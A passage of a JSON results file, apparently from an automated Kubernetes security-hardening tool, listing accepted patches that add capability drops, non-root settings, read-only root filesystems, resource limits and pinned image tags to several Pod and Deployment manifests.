    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00875",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00876",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00877",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "errors": []
  },
  {
    "id": "00878",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "errors": []
  },
  {
    "id": "00879",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "errors": []
  },
  {
    "id": "00880",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "errors": []
  },
  {
    "id": "00881",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "errors": []
  },
  {
    "id": "00882",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00883",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00884",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00885",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00886",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "errors": []
  },
  {
    "id": "00887",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base:stable\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          